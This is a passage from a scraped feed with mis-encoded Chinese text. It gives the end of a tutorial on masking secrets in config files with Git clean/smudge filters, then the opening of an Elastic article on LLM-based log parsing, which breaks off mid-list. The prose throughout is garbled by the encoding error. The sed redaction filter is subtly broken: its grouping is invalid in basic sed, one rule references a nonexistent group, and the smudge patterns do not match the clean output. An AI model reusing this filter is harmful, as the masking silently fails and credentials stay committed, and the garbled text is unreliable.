<p>æˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ª <code>.gitattributes</code> æ–‡ä»¶ï¼Œå‘Šè¯‰ Gitâ€œå“ªäº›æ–‡ä»¶éœ€è¦ç”¨ä¸Šé¢é…ç½®çš„è¿‡æ»¤å™¨â€ã€‚è¿™ä¸ªæ–‡ä»¶è¦æäº¤åˆ°ä»“åº“ï¼Œè®©å›¢é˜Ÿæ‰€æœ‰äººéƒ½èƒ½ç”¨åŒæ ·çš„è§„åˆ™ã€‚</p>
<ol>
<li>åœ¨é¡¹ç›®æ ¹ç›®å½•æ–°å»ºæ–‡ä»¶ï¼Œå‘½åä¸º <code>.gitattributes</code>ï¼›</li>
<li>å†™å…¥ä¸‹é¢çš„å†…å®¹ï¼ˆæ ¹æ®ä½ çš„é…ç½®æ–‡ä»¶è°ƒæ•´ï¼‰ï¼š</li>
</ol>

<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># æ ¼å¼ï¼šã€éœ€è¦è¿‡æ»¤çš„æ–‡ä»¶ã€‘ filter=è¿‡æ»¤å™¨åç§°</span>
â€‹
<span class="hljs-comment"># å•æ–‡ä»¶ç²¾å‡†åŒ¹é…ï¼ˆæ¨èï¼Œç²¾å‡†è„±æ•ï¼‰</span>
settings.yaml <span class="hljs-attr">filter</span>=sensitive_filter
â€‹
<span class="hljs-comment"># é€šé…ç¬¦åŒ¹é…ï¼ˆæ‰¹é‡è„±æ•ï¼Œé€‚åˆåŒç±»å‹é…ç½®æ–‡ä»¶ï¼‰</span>
*.yml <span class="hljs-attr">filter</span>=sensitive_filter
â€‹
<span class="hljs-comment"># æ’é™¤ä¸éœ€è¦è¿‡æ»¤çš„æ–‡ä»¶ï¼ˆå¯é€‰ï¼‰</span>
README.md !filter
â€‹
<span class="hljs-comment"># æ³¨æ„ï¼šè¿‡æ»¤å™¨åç§° `sensitive_filter` å¿…é¡»å’Œæ­¥éª¤ 1 ä¸­é…ç½®çš„å®Œå…¨ä¸€è‡´ï¼ˆå¤§å°å†™æ•æ„Ÿï¼‰</span>
</code></pre>
<p>å†™å®Œåï¼Œæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤æäº¤è¿™ä¸ªæ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-sql" lang="sql">git <span class="hljs-keyword">add</span> .gitattributes
git <span class="hljs-keyword">commit</span> <span class="hljs-operator">-</span>m "æ·»åŠ æ•æ„Ÿæ–‡ä»¶è¿‡æ»¤è§„åˆ™"
</code></pre>
<h3 data-id="heading-11">ç¬¬ä¸‰æ­¥ï¼šéªŒè¯é…ç½®æ˜¯å¦æˆåŠŸ</h3>
<p>æŸ¥çœ‹å·²é…ç½®çš„è¿‡æ»¤è§„åˆ™ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-meta"># æŸ¥çœ‹å…¨å±€è¿‡æ»¤å™¨é…ç½®</span>
git config --<span class="hljs-keyword">global</span> --<span class="hljs-keyword">get</span>-regexp filter
â€‹
<span class="hljs-meta"># æŸ¥çœ‹å½“å‰é¡¹ç›®è¿‡æ»¤å™¨é…ç½®</span>
git config --<span class="hljs-keyword">get</span>-regexp filter
â€‹
<span class="hljs-meta"># æŸ¥çœ‹æ‰€æœ‰ Git é…ç½®ï¼ˆå«è¿‡æ»¤å™¨ï¼‰</span>
git config --list
</code></pre>
<h3 data-id="heading-12">ç¬¬å››æ­¥ï¼šä½¿ç”¨éªŒè¯</h3>
<p>å¦‚æœä½ çš„é…ç½®æ–‡ä»¶ä¹‹å‰å·²ç»è¢« Git è¿½è¸ªè¿‡ï¼ˆæ¯”å¦‚å·²ç»æäº¤è¿‡ï¼‰ï¼Œéœ€è¦å…ˆæŠŠå®ƒä» Git æš‚å­˜åŒºç§»é™¤ï¼ˆä¸ä¼šåˆ é™¤æœ¬åœ°æ–‡ä»¶ï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">rm</span> --cached <span class="hljs-string">"è¢«è„±æ•æ–‡ä»¶çš„åœ°å€"</span>
</code></pre>
<p>ç„¶åéªŒè¯è„±æ•æ•ˆæœï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-meta"># å°†æ–‡ä»¶åŠ å…¥æš‚å­˜åŒºï¼ˆè§¦å‘ clean è„±æ•ï¼‰</span>
git <span class="hljs-keyword">add</span> <span class="hljs-string">"è¢«è„±æ•æ–‡ä»¶çš„åœ°å€"</span>
â€‹
<span class="hljs-meta"># æŸ¥çœ‹æš‚å­˜åŒºä¸­æ–‡ä»¶çš„è„±æ•æ•ˆæœ</span>
git diff --cached <span class="hljs-string">"è¢«è„±æ•æ–‡ä»¶çš„åœ°å€"</span>
â€‹
<span class="hljs-meta"># æäº¤åˆ°æœ¬åœ°ä»“åº“</span>
git commit -m <span class="hljs-string">"feat: æäº¤è„±æ•åçš„é…ç½®æ–‡ä»¶"</span>
</code></pre>
<h3 data-id="heading-13">è¡¥å……ï¼šç”¨æ­£åˆ™å®ç°â€œä»»æ„æ•æ„Ÿå€¼è‡ªåŠ¨è„±æ•â€</h3>
<p>å¦‚æœä½ çš„é…ç½®æ–‡ä»¶é‡Œæ•æ„Ÿå€¼ç»å¸¸å˜ï¼Œä¸æƒ³æ¯æ¬¡éƒ½æ‰‹åŠ¨åŠ æ›¿æ¢è§„åˆ™ï¼Œå¯ä»¥ç”¨æ­£åˆ™è¡¨è¾¾å¼å†™ clean è§„åˆ™ï¼Œå®ç°â€œåªè¦æ˜¯æŸä¸ªå­—æ®µï¼Œå°±è‡ªåŠ¨æ›¿æ¢æˆå ä½ç¬¦â€ã€‚</p>
<p>æ¯”å¦‚è¿™æ ·é…ç½®è¿‡æ»¤å™¨ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-section">[filter "sensitive_filter"]</span>
 Â   <span class="hljs-attr">clean</span> = sed -e <span class="hljs-string">'s/(password:\s*).*/\1******/g'</span> -e <span class="hljs-string">'s/(secret:\s*).*/\2******/g'</span> -e <span class="hljs-string">'s/(token:\s*).*/\1******/g'</span>
 Â   <span class="hljs-attr">smudge</span> = sed -e <span class="hljs-string">'s/password: 1******/password: my_db_pass_123/g'</span> -e <span class="hljs-string">'s/secret: 2******/secret: my_jwt_7890/g'</span>
 Â   <span class="hljs-attr">required</span> = <span class="hljs-literal">true</span>
</code></pre>
<p>è¯´æ˜ï¼šè¿™ç§æ–¹å¼é€‚åˆæ•æ„Ÿå­—æ®µå›ºå®šï¼Œä½†å€¼ç»å¸¸å˜çš„åœºæ™¯ï¼Œä¸è¿‡ smudge è§„åˆ™è¿˜æ˜¯è¦æ‰‹åŠ¨ç»´æŠ¤çœŸå®å€¼ï¼Œä¸å¦‚è‡ªåŠ¨åŒ–è„šæœ¬çœå¿ƒã€‚</p>
<h2 data-id="heading-14">å››ã€æ€»ç»“ä¸€ä¸‹</h2>
<p>å¦‚æœæ˜¯æ­£åœ¨å¼€å‘çš„é¡¹ç›®ï¼Œä¼˜å…ˆç”¨ã€ŒGit å†…ç½®è¿‡æ»¤å™¨ã€+ã€Œè‡ªåŠ¨åŒ–è„šæœ¬ã€ï¼Œä¸€é”®é…ç½®ï¼Œå…¨ç¨‹è‡ªåŠ¨è„±æ•/è¿˜åŸï¼Œä¸å½±å“å¼€å‘ï¼›å¦‚æœæ˜¯å·²å¼€å‘å®Œçš„é¡¹ç›®ï¼Œç”¨æ¨¡æ¿æ–‡ä»¶æˆ–ç¯å¢ƒå˜é‡çš„æ–¹å¼æ›´ç®€å•ã€‚</p>
<p>æ ¸å¿ƒåŸåˆ™å°±æ˜¯ï¼šæ•æ„Ÿä¿¡æ¯åªç•™åœ¨æœ¬åœ°ï¼Œä»“åº“é‡Œåªå­˜è„±æ•åçš„å†…å®¹ï¼Œæ—¢å®‰å…¨åˆçœå¿ƒï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Elasticsearchï¼šåœ¨ Streams ä¸­ä½¿ç”¨ ML è‡ªåŠ¨åŒ– log è§£æ]]></title>    <link>https://juejin.cn/post/7589940210832506923</link>    <guid>https://juejin.cn/post/7589940210832506923</guid>    <pubDate>2026-01-03T01:51:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589940210832506923" data-draft-id="7590020026395492406" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Elasticsearchï¼šåœ¨ Streams ä¸­ä½¿ç”¨ ML è‡ªåŠ¨åŒ– log è§£æ"/> <meta itemprop="keywords" content="Elasticsearch"/> <meta itemprop="datePublished" content="2026-01-03T01:51:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Elasticsearch"/> <meta itemprop="url" content="https://juejin.cn/user/2612095360441448"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Elasticsearchï¼šåœ¨ Streams ä¸­ä½¿ç”¨ ML è‡ªåŠ¨åŒ– log è§£æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2612095360441448/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Elasticsearch
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-03T01:51:28.000Z" title="Sat Jan 03 2026 01:51:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»12åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½œè€…ï¼šæ¥è‡ª ElasticÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fsearch-labs%2Fauthor%2Fnastia-havriushenko" title="https://www.elastic.co/search-labs/author/nastia-havriushenko" target="_blank" ref="nofollow noopener noreferrer">Nastia Havriushenko</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e843b17925e242e185dd66e6eedecd4e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768009888&amp;x-signature=S0dr2cF7VlTFkkPYi%2Fa0Xj73PEk%3D" alt="" loading="lazy"/></p>
<p>äº†è§£ä¸€ç§æ··åˆ ML æ–¹æ³•å¦‚ä½•é€šè¿‡åœ¨ Streams ä¸­ä½¿ç”¨ log æ ¼å¼æŒ‡çº¹è¯†åˆ«çš„è‡ªåŠ¨åŒ–å®éªŒï¼Œå®ç° 94% çš„ log è§£æå‡†ç¡®ç‡å’Œ 91% çš„ log åˆ†åŒºå‡†ç¡®ç‡ã€‚</p>
<p>æ— ç¼è¿æ¥é¢†å…ˆçš„ AI å’Œ machine learning å¹³å°ã€‚å¼€å§‹ä¸€ä¸ª<a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.elastic.co%2Fregistration" title="https://cloud.elastic.co/registration" target="_blank" ref="nofollow noopener noreferrer">å…è´¹çš„ cloud è¯•ç”¨</a>æ¥æ¢ç´¢ Elastic çš„ gen AI èƒ½åŠ›ï¼Œæˆ–è€…ç°åœ¨å°±åœ¨ä½ çš„<a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F143747798" title="https://elasticstack.blog.csdn.net/article/details/143747798" target="_blank" ref="nofollow noopener noreferrer">æœºå™¨</a>ä¸Šè¯•ç”¨ã€‚</p>
<p>åœ¨ç°ä»£å¯è§‚æµ‹æ€§æŠ€æœ¯æ ˆä¸­ï¼Œå°†æ¥è‡ªä¸åŒæ•°æ®æä¾›æ–¹çš„éç»“æ„åŒ– log æ‘„å–åˆ°åƒ Elasticsearch è¿™æ ·çš„å¹³å°ä»ç„¶æ˜¯ä¸€ä¸ªæŒ‘æˆ˜ã€‚ä¾èµ–æ‰‹å·¥ç¼–å†™çš„è§£æè§„åˆ™ä¼šäº§ç”Ÿè„†å¼±çš„ç®¡é“ï¼Œå³ä½¿ä¸Šæ¸¸ä»£ç çš„è½»å¾®æ›´æ–°ä¹Ÿä¼šå¯¼è‡´è§£æå¤±è´¥å’Œæ•°æ®æ— æ³•è¢«ç´¢å¼•ã€‚è¿™ç§è„†å¼±æ€§è¿˜å› å¯æ‰©å±•æ€§é—®é¢˜è€ŒåŠ å‰§ï¼šåœ¨åŠ¨æ€çš„ microservices ç¯å¢ƒä¸­ï¼Œä¸æ–­æ–°å¢çš„æ–°æœåŠ¡ä½¿å¾—æ‰‹åŠ¨ç»´æŠ¤è§„åˆ™å˜æˆä¸€åœºè¿ç»´å™©æ¢¦ã€‚</p>
<p>æˆ‘ä»¬çš„ç›®æ ‡æ˜¯è½¬å‘ä¸€ç§è‡ªåŠ¨åŒ–ã€å¯è‡ªé€‚åº”çš„æ–¹æ³•ï¼Œèƒ½å¤ŸåŒæ—¶å¤„ç† log è§£æï¼ˆå­—æ®µæå–ï¼‰å’Œ log åˆ†åŒºï¼ˆæ¥æºè¯†åˆ«ï¼‰ã€‚æˆ‘ä»¬å‡è®¾ï¼Œå¤§è¯­è¨€æ¨¡å‹ LLMs å‡­å€Ÿå…¶å¯¹ä»£ç è¯­æ³•å’Œè¯­ä¹‰æ¨¡å¼çš„å†…åœ¨ç†è§£ï¼Œå¯ä»¥åœ¨å‡ ä¹ä¸éœ€è¦äººå·¥å¹²é¢„çš„æƒ…å†µä¸‹è‡ªåŠ¨å®Œæˆè¿™äº›ä»»åŠ¡ã€‚</p>
<h2 data-id="heading-0">æ•°æ®é›†æè¿°</h2>
<p>æˆ‘ä»¬é€‰æ‹©äº† <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flogpai%2Floghub" title="https://github.com/logpai/loghub" target="_blank" ref="nofollow noopener noreferrer">Loghub</a> çš„ log é›†åˆä½œä¸º PoC çš„æ•°æ®æ¥æºã€‚åœ¨æœ¬æ¬¡ç ”ç©¶ä¸­ï¼Œæˆ‘ä»¬ä»ä»¥ä¸‹å…³é”®é¢†åŸŸé€‰æ‹©äº†å…·æœ‰ä»£è¡¨æ€§çš„æ ·æœ¬ï¼š</p>
<ul>
<li><strong>åˆ†å¸ƒå¼ç³»ç»Ÿ</strong>ï¼šæˆ‘ä»¬ä½¿ç”¨äº† HDFSï¼ˆHadoop Distributed File Systemï¼‰å’Œ Spark æ•°æ®é›†ã€‚è¿™äº›æ•°æ®é›†åŒ…å«äº†å…¸å‹çš„å¤§æ•°æ®å¹³å°ä¸­çš„ infoã€debug å’Œ error æ¶ˆæ¯ã€‚</li>
<li><strong>æœåŠ¡å™¨å’Œ web åº”ç”¨</strong>ï¼šæ¥è‡ª Apache web æœåŠ¡å™¨å’Œ OpenSSH çš„ logs æä¾›äº†å¤§é‡è®¿é—®ã€é”™è¯¯ä»¥åŠä¸å®‰å…¨ç›¸å…³çš„äº‹ä»¶ã€‚è¿™äº›å¯¹äºç›‘æ§ web æµé‡å’Œæ£€æµ‹æ½œåœ¨å¨èƒè‡³å…³é‡è¦ã€‚</li>
<li><strong>æ“ä½œç³»ç»Ÿ</strong>ï¼šæˆ‘ä»¬åŒ…å«äº† Linux å’Œ Windows çš„ logsã€‚è¿™äº›æ•°æ®é›†ä»£è¡¨äº†è¿ç»´å›¢é˜Ÿæ—¥å¸¸é‡åˆ°çš„å¸¸è§ã€åŠç»“æ„åŒ–çš„ç³»ç»Ÿçº§äº‹ä»¶ã€‚</li>
<li><strong>ç§»åŠ¨ç³»ç»Ÿ</strong>ï¼šä¸ºäº†ç¡®ä¿æˆ‘ä»¬çš„æ¨¡å‹èƒ½å¤Ÿå¤„ç†æ¥è‡ªç§»åŠ¨ç¯å¢ƒçš„ logsï¼Œæˆ‘ä»¬åŠ å…¥äº† Android æ•°æ®é›†ã€‚è¿™äº› logs é€šå¸¸éå¸¸å†—é•¿ï¼Œè®°å½•äº†ç§»åŠ¨è®¾å¤‡ä¸Šå¤§é‡åº”ç”¨çº§å’Œç³»ç»Ÿçº§æ´»åŠ¨ã€‚</li>
<li><strong>è¶…çº§è®¡ç®—æœº</strong>ï¼šä¸ºäº†æµ‹è¯•åœ¨é«˜æ€§èƒ½è®¡ç®— HPC ç¯å¢ƒä¸‹çš„è¡¨ç°ï¼Œæˆ‘ä»¬å¼•å…¥äº† BGLï¼ˆBlue Gene/Lï¼‰æ•°æ®é›†ã€‚è¯¥æ•°æ®é›†åŒ…å«é«˜åº¦ç»“æ„åŒ–çš„ logsï¼Œå¹¶å¸¦æœ‰ç‰¹å®šé¢†åŸŸçš„æœ¯è¯­ã€‚</li>
</ul>
<p>Loghub é›†åˆçš„ä¸€ä¸ªå…³é”®ä¼˜åŠ¿åœ¨äºï¼Œè¿™äº› logs å¤§å¤šæ˜¯æœªæ¸…æ´—ã€æœªæ ‡æ³¨çš„ï¼ŒçœŸå®åœ°æ¨¡æ‹Ÿäº†å…·æœ‰ microservice æ¶æ„çš„å˜ˆæ‚ç”Ÿäº§ç¯å¢ƒã€‚</p>
<p>Log ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">`

<span class="hljs-number">1</span>.  <span class="hljs-selector-attr">[Sun Dec 04 20:34:21 2005]</span> <span class="hljs-selector-attr">[notice]</span> <span class="hljs-built_in">jk2_init</span>() Found child <span class="hljs-number">2008</span> in scoreboard slot <span class="hljs-number">6</span>
<span class="hljs-number">2</span>.  <span class="hljs-selector-attr">[Sun Dec 04 20:34:25 2005]</span> <span class="hljs-selector-attr">[notice]</span> workerEnv<span class="hljs-selector-class">.init</span>() ok /etc/httpd/conf/workers2<span class="hljs-selector-class">.properties</span>
<span class="hljs-number">3</span>.  <span class="hljs-selector-attr">[Mon Dec 05 11:06:51 2005]</span> <span class="hljs-selector-attr">[notice]</span> workerEnv<span class="hljs-selector-class">.init</span>() ok /etc/httpd/conf/workers2<span class="hljs-selector-class">.properties</span>
<span class="hljs-number">4</span>.  <span class="hljs-number">17</span>/<span class="hljs-number">06</span>/<span class="hljs-number">09</span> <span class="hljs-number">20</span>:<span class="hljs-number">10</span>:<span class="hljs-number">58</span> INFO output.FileOutputCommitter: Saved output of task <span class="hljs-string">'attempt_201706092018_0024_m_000083_1138'</span> to hdfs://<span class="hljs-number">10.10</span>.<span class="hljs-number">34.11</span>:<span class="hljs-number">9000</span>/pjhe/test/<span class="hljs-number">1</span>/_temporary/<span class="hljs-number">0</span>/task_201706092018_0024_m_000083
<span class="hljs-number">5</span>.  <span class="hljs-number">17</span>/<span class="hljs-number">06</span>/<span class="hljs-number">09</span> <span class="hljs-number">20</span>:<span class="hljs-number">10</span>:<span class="hljs-number">58</span> INFO mapred.SparkHadoopMapRedUtil: attempt_201706092018_0024_m_000083_1138: Committed

`AIå†™ä»£ç 
</code></pre>
<p>æ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜åˆ›å»ºäº†ä¸€ä¸ª Kubernetes é›†ç¾¤ï¼Œé‡‡ç”¨å…¸å‹çš„ web åº”ç”¨ + æ•°æ®åº“ çš„è®¾ç½®ï¼Œåœ¨æœ€å¸¸è§çš„é¢†åŸŸä¸­æŒ–æ˜é¢å¤–çš„ logsã€‚</p>
<p>å¸¸è§ log å­—æ®µç¤ºä¾‹ï¼štimestampã€log levelï¼ˆINFOã€WARNã€ERRORï¼‰ã€sourceã€messageã€‚</p>
<h2 data-id="heading-1">ä½¿ç”¨ LLM è¿›è¡Œ few-shot log è§£æ</h2>
<p>æˆ‘ä»¬çš„ç¬¬ä¸€ç»„å®éªŒèšç„¦äºä¸€ä¸ªåŸºç¡€é—®é¢˜ï¼š<strong>LLM æ˜¯å¦èƒ½å¤Ÿå¯é åœ°è¯†åˆ«å…³é”®å­—æ®µï¼Œå¹¶ç”Ÿæˆä¸€è‡´çš„è§£æè§„åˆ™æ¥æå–å®ƒä»¬ï¼Ÿ</strong></p>
<p>æˆ‘ä»¬è®©æ¨¡å‹åˆ†æåŸå§‹ log æ ·æœ¬ï¼Œå¹¶ç”Ÿæˆ regular expressionï¼ˆregexï¼‰å’Œ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Fexplore-analyze%2Fscripting%2Fgrok" title="https://www.elastic.co/docs/explore-analyze/scripting/grok" target="_blank" ref="nofollow noopener noreferrer">Grok</a> æ ¼å¼çš„ log è§£æè§„åˆ™ã€‚ç»“æœè¡¨æ˜ï¼Œè¿™ç§æ–¹æ³•å…·æœ‰å¾ˆå¤§æ½œåŠ›ï¼Œä½†åœ¨å®ç°å±‚é¢ä¹Ÿå­˜åœ¨æ˜¾è‘—æŒ‘æˆ˜ã€‚</p>
<h3 data-id="heading-2">é«˜ç½®ä¿¡åº¦ä¸ä¸Šä¸‹æ–‡æ„ŸçŸ¥</h3>
<p>åˆæ­¥ç»“æœä»¤äººé¼“èˆã€‚LLM å±•ç°äº†å¾ˆå¼ºçš„èƒ½åŠ›ï¼Œèƒ½å¤Ÿä»¥é«˜ç½®ä¿¡åº¦ç”Ÿæˆä¸æä¾›çš„ few-shot ç¤ºä¾‹ç›¸åŒ¹é…çš„è§£æè§„åˆ™ã€‚é™¤äº†ç®€å•çš„æ¨¡å¼åŒ¹é…ä¹‹å¤–ï¼Œæ¨¡å‹è¿˜è¡¨ç°å‡ºå¯¹ log çš„ç†è§£èƒ½åŠ› â€”â€” å®ƒå¯ä»¥æ­£ç¡®è¯†åˆ«å¹¶å‘½å log æ¥æºï¼ˆä¾‹å¦‚ å¥åº·è¿½è¸ª appã€Nginx web appã€Mongo æ•°æ®åº“ï¼‰ã€‚</p>
<h3 data-id="heading-3">è¾“å…¥æ ·æœ¬çš„ â€œGoldilocksï¼ˆæ°åˆ°å¥½å¤„å›°å¢ƒï¼‰â€ å›°å¢ƒ</h3>
<p>æˆ‘ä»¬çš„å®éªŒå¾ˆå¿«æš´éœ²å‡ºä¸€ä¸ªæ˜¾è‘—çš„é²æ£’æ€§ä¸è¶³é—®é¢˜ï¼Œå³æ¨¡å‹å¯¹è¾“å…¥æ ·æœ¬æåº¦æ•æ„Ÿã€‚æ¨¡å‹çš„è¡¨ç°ä¼šéšç€ prompt ä¸­åŒ…å«çš„å…·ä½“ log ç¤ºä¾‹è€Œå‰§çƒˆæ³¢åŠ¨ã€‚æˆ‘ä»¬è§‚å¯Ÿåˆ°ä¸€ä¸ª log ç›¸ä¼¼æ€§é—®é¢˜ï¼šlog æ ·æœ¬éœ€è¦ <strong>æ°åˆ°å¥½å¤„</strong> åœ°å¤šæ ·åŒ–ï¼š</p>
<ul>
<li><strong>è¿‡äºåŒè´¨ï¼ˆoverfittingï¼‰</strong>ï¼šå¦‚æœè¾“å…¥çš„ logs è¿‡äºç›¸ä¼¼ï¼ŒLLM å¾€å¾€ä¼šè¿‡åº¦å…·ä½“åŒ–ã€‚å®ƒä¼šæŠŠå¯å˜æ•°æ® â€”â€” ä¾‹å¦‚ stack trace ä¸­çš„ç‰¹å®š Java class åç§° â€”â€” å½“ä½œæ¨¡æ¿ä¸­çš„é™æ€éƒ¨åˆ†ã€‚è¿™ä¼šå¯¼è‡´ç”Ÿæˆçš„è§„åˆ™éå¸¸è„†å¼±ï¼Œåªèƒ½è¦†ç›–æå°‘æ¯”ä¾‹çš„ logsï¼Œå¹¶ä¸”æå–å‡ºçš„å­—æ®µä¸å¯ç”¨ã€‚</li>
